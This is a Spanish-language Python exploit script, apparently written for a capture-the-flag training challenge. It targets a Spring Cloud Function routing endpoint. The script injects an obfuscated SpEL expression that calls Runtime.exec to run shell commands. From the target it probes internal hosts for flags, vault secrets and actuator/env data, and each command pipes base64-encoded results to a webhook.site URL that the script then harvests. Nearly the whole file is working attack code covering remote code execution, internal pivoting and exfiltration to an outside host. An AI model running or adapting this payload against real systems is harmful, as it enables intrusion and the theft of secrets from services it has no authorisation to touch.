#!/usr/bin/env python3
"""
CTF Chile - COSECHA FINAL DE FLAGS
Infiltración Profunda: El Robo a OmniVault

Servicios internos identificados:
- 10.160.209.1: puertos 80, 8080, 443, 8443, 3000
- 10.160.209.2: puertos 80, 8080, 443, 8443, 3000

Estrategia: buscar flags en paths típicos de cada servicio
"""
import requests
import time
import base64

TARGET = "http://training-pod2.ctfchile.com:32778"
ROUTER = TARGET + "/functionRouter"

print("[*] Creando webhook para cosecha final...")
UUID = requests.post("https://webhook.site/token", timeout=10).json()["uuid"]
WH = "https://webhook.site/" + UUID
print("    URL: https://webhook.site/#!/" + UUID)
print()

def build_payload(cmd):
    esc = cmd.replace("\\", "\\\\").replace('"', '\\"')
    return (
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("exe"+"c",new String[]{}.getClass())'
        '.invoke('
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("getRunt"+"ime").invoke(null),'
        'new String[]{"/bin/sh","-c","' + esc + '"}'
        ').waitFor()'
    )

def fire(tag, cmd):
    try:
        r = requests.post(
            ROUTER,
            headers={
                "spring.cloud.function.routing-expression": build_payload(cmd),
                "Content-Type": "text/plain",
            },
            data="x",
            timeout=15,
        )
        print("    [+] %-25s http %s" % (tag, r.status_code))
    except Exception as e:
        print("    [!] %s: %s" % (tag, e))

def probe_url(tag, url):
    """Hace curl a una URL y envía el resultado al webhook"""
    cmd = "curl -s --connect-timeout 5 '%s' | head -20 | base64 -w0 | xargs -I X curl -s '%s/%s?d=X'" % (url, WH, tag)
    fire(tag, cmd)

def probe_flag_file(tag, host, path):
    """Busca archivo flag específico en un host"""
    cmd = "curl -s --connect-timeout 5 'http://%s%s' | base64 -w0 | xargs -I X curl -s '%s/%s?d=X' 2>/dev/null" % (host, path, WH, tag)
    fire(tag, cmd)

# === COSECHA DE FLAGS ===
print("[*] Cosechando flags de servicios internos...")

# Servicios web típicos
hosts = ["10.160.209.1", "10.160.209.2"]
ports = ["80", "8080", "3000", "8443"]

# 1) Páginas principales de cada servicio
for i, host in enumerate(hosts):
    for j, port in enumerate(ports):
        tag = f"S{i+1}P{port}_index"
        url = f"http://{host}:{port}/"
        probe_url(tag, url)

        tag = f"S{i+1}P{port}_api"
        url = f"http://{host}:{port}/api/"
        probe_url(tag, url)

# 2) Paths típicos de flags
flag_paths = [
    "/flag.txt", "/flag", "/flag.php", "/api/flag", "/admin/flag",
    "/secret.txt", "/secret", "/vault/flag", "/omni/flag",
    "/.flag", "/hidden/flag", "/api/v1/flag", "/internal/flag"
]

for i, host in enumerate(hosts):
    for path in flag_paths:
        tag = f"S{i+1}_flag_{path.replace('/', '_')}"
        probe_flag_file(tag, f"{host}", path)
        # También en puerto 8080
        tag = f"S{i+1}8080_flag_{path.replace('/', '_')}"
        probe_flag_file(tag, f"{host}:8080", path)

# 3) APIs específicas de OmniVault
omni_endpoints = [
    "/api/vault/status", "/api/vault/list", "/api/vault/secrets",
    "/api/admin/config", "/api/system/status", "/api/debug/info",
    "/management/health", "/actuator/health", "/actuator/env"
]

for i, host in enumerate(hosts):
    for endpoint in omni_endpoints:
        tag = f"S{i+1}_omni_{endpoint.replace('/', '_')}"
        probe_url(tag, f"http://{host}:8080{endpoint}")

# 4) Búsqueda exhaustiva de archivos flag
for i, host in enumerate(hosts):
    tag = f"S{i+1}_find_flags"
    cmd = f"curl -s --connect-timeout 3 'http://{host}/api/search?q=flag' | base64 -w0 | xargs -I X curl -s '{WH}/{tag}?d=X'"
    fire(tag, cmd)

print()
print("[*] Esperando 15s para recibir todas las respuestas...")
time.sleep(15)

# === RECOLECCIÓN Y ANÁLISIS ===
print("[*] Recolectando resultados...")
r = requests.get(f"https://webhook.site/token/{UUID}/requests?per_page=100", timeout=10)
requests_data = r.json().get("data", [])
print(f"    {len(requests_data)} requests recibidos")
print()

flags_found = []
interesting_data = []

for req in requests_data:
    url = req.get("url", "")
    path = url.split(f"webhook.site/{UUID}/")[-1].split("?")[0]
    query = req.get("query") or {}
    raw = query.get("d")

    if isinstance(raw, list):
        raw = raw[0] if raw else ""

    if raw:
        try:
            decoded = base64.b64decode(raw).decode("utf-8", "replace")

            # Buscar flags (formato típico CTF{...})
            if "CTF{" in decoded or "flag{" in decoded or "FLAG{" in decoded:
                flags_found.append({
                    "source": path,
                    "content": decoded
                })

            # Contenido interesante
            if any(keyword in decoded.lower() for keyword in ["vault", "secret", "admin", "flag", "token"]):
                interesting_data.append({
                    "source": path,
                    "content": decoded[:200] + "..." if len(decoded) > 200 else decoded
                })

        except Exception:
            pass

# === RESULTADOS ===
print("=" * 80)
print("🎯 FLAGS ENCONTRADAS:")
if flags_found:
    for flag in flags_found:
        print(f"Source: {flag['source']}")
        print(f"Flag: {flag['content']}")
        print("-" * 40)
else:
    print("No se encontraron flags directas. Revisando contenido interesante...")

print("\n🔍 CONTENIDO INTERESANTE:")
for data in interesting_data[:10]:  # Mostrar solo los primeros 10
    print(f"Source: {data['source']}")
    print(f"Content: {data['content']}")
    print("-" * 40)

print(f"\n🌐 Ver todos los requests en: https://webhook.site/#!/{UUID}")
print("\n[*] Cosecha completada!")